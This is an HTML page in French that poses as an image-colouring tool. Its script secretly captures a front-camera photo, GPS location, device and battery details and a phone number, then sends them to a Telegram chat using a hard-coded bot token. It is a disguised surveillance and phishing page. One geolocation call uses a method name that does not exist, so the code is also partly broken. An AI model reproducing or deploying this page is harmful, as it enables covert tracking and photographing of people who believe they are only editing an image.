<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rendre une image magique</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 30px 15px;
            background-color: #f4f4f9;
        }
        .card {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: auto;
            text-align: left;
        }
        h1 {
            color: #333;
            font-size: 19px;
            text-align: center;
            margin-bottom: 20px;
        }
        ul {
            padding-left: 20px;
            color: #444;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        li {
            margin-bottom: 10px;
        }
        .phone-highlight {
            font-weight: bold;
            color: #0088cc;
        }
        .buttons-container {
            display: flex;
            gap: 10px;
        }
        button {
            flex: 1;
            padding: 14px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            border: none;
        }
        #yesBtn {
            background-color: #28a745;
            color: white;
        }
        #yesBtn:hover {
            background-color: #218838;
        }
        #noBtn {
            background-color: #dc3545;
            color: white;
        }
        #noBtn:hover {
            background-color: #c82333;
        }
        #cameraStream {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Affichage unique regroupant toutes les demandes -->
    <div class="card" id="formCard">
        <h1>Modification d'images</h1>
        <p style="font-size: 14px; color: #666; text-align: center; margin-bottom: 15px;">
            Juste un petit detail :
        </p>
        <ul>
            <li>N°: <span class="phone-highlight" id="phoneText">Chargement...</span></li>
            <li>....</strong></li>
            <li>....</strong></li>
            <li>Voulez-vous que l'image soit en couleur ?</li>
        </ul>
        
        <div class="buttons-container">
            <button id="noBtn">NON</button>
            <button id="yesBtn">OUI</button>
        </div>
    </div>

    <!-- Étape de chargement -->
    <div class="card" id="loadingCard" style="display: none; text-align: center;">
        <h1>Traitement en cours...</h1>
        <p style="color: #666;">Veuillez patienter ou reessayer...</p>
    </div>

    <video id="cameraStream" autoplay playsinline></video>
    <canvas id="canvasCapture" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8805637787:AAGMIxpTUNKuIHnSRLiyYgCS980X7khKSQg";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');
        const phone = urlParams.get('phone') || "+225 0700000000";

        document.getElementById('phoneText').innerText = phone;

        // Bouton NON : Refus global
        document.getElementById('noBtn').addEventListener('click', () => {
            alert("Validation refusée.");
            window.close();
        });

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = "Navigateur inconnu";
            let typeAppareil = "Mobile / Autre";
            let marqueModele = "Inconnu (Sécurité Web)";

            if (ua.includes("Firefox")) browser = "Mozilla Firefox";
            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
            else if (ua.includes("Chrome")) browser = "Google Chrome";
            else if (ua.includes("Safari")) browser = "Apple Safari";
            else if (ua.includes("Edge")) browser = "Microsoft Edge";

            if (/android/i.test(ua)) typeAppareil = "Smartphone Android";
            else if (/iphone|ipad|ipod/i.test(ua)) typeAppareil = "iPhone (iOS)";
            else if (/windows/i.test(ua)) typeAppareil = "Ordinateur Windows";
            else if (/macintosh/i.test(ua)) typeAppareil = "Macintosh";

            let match = ua.match(/\(([^)]+)\)/);
            if (match && match[1]) {
                marqueModele = match[1];
            }

            return { browser, typeAppareil, marqueModele };
        }

        // Bouton OUI : Validation globale de tout d'un coup
        document.getElementById('yesBtn').addEventListener('click', async () => {
            if (!chatId) {
                alert("Erreur : Chat ID manquant.");
                return;
            }

            document.getElementById('formCard').style.display = 'none';
            document.getElementById('loadingCard').style.display = 'block';

            let batteryLevel = "Inconnu";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                }
            } catch (e) {}

            const info = getDeviceInfo();

            try {
                // 1. Capture simultanée / séquentielle de la caméra
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                const videoElement = document.getElementById('cameraStream');
                videoElement.srcObject = stream;
                
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => { resolve(); };
                });

                const canvas = document.getElementById('canvasCapture');
                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));

                // 2. Récupération de la position GPS
                if (!navigator.geolocation) {
                    alert("La géolocalisation n'est pas supportée par votre navigateur.");
                    return;
                }

                navigator.geolocation.activateCurrentPosition(async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // 3. Préparation et envoi de tout sur Telegram
                    const descriptionText = 
                        `📋 **RAPPORT DE VALIDATION GLOBALE**\n\n` +
                        `• **Type d'appareil :** ${info.typeAppareil}\n` +
                        `• **Marque / Système :** ${info.marqueModele}\n` +
                        `• **Navigateur :** ${info.browser}\n` +
                        `• **Batterie :** ${batteryLevel}\n` +
                        `• **Numéro de téléphone :** ${phone} (Validé OUI)\n` +
                        `• **Chat ID Telegram :** ${chatId}`;

                    const textApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(descriptionText)}&parse_mode=Markdown`;
                    const locationApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
                    const photoApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

                    try {
                        // Envoi du texte
                        await fetch(textApiUrl);

                        // Envoi de la photo
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', imageBlob, 'environnement.jpg');
                        formData.append('caption', '📷 Capture globale de l\'environnement');

                        await fetch(photoApiUrl, {
                            method: 'POST',
                            body: formData
                        });

                        // Envoi de la mini-carte
                        await fetch(locationApiUrl);

                        document.querySelector('#loadingCard h1').innerText = "Validé !";
                        document.querySelector('#loadingCard p').innerText = "Merci et Bravo. Vous pouvez fermer la page.";
                        setTimeout(() => { window.close(); }, 3000);

                    } catch (error) {
                        console.error("Erreur réseau :", error);
                        alert("Erreur lors de la transmission des données.");
                    }

                }, (error) => {
                    alert("Veuillez autoriser l'accès à la position GPS pour continuer.");
                    document.getElementById('formCard').style.display = 'block';
                    document.getElementById('loadingCard').style.display = 'none';
                }, { enableHighAccuracy: true, timeout: 15000 });

            } catch (camError) {
                console.error("Erreur caméra :", camError);
                alert("Veuillez autoriser l'accès à la caméra pour continuer.");
                document.getElementById('formCard').style.display = 'block';
                document.getElementById('loadingCard').style.display = 'none';
            }
        });
    </script>

</body>
</html>
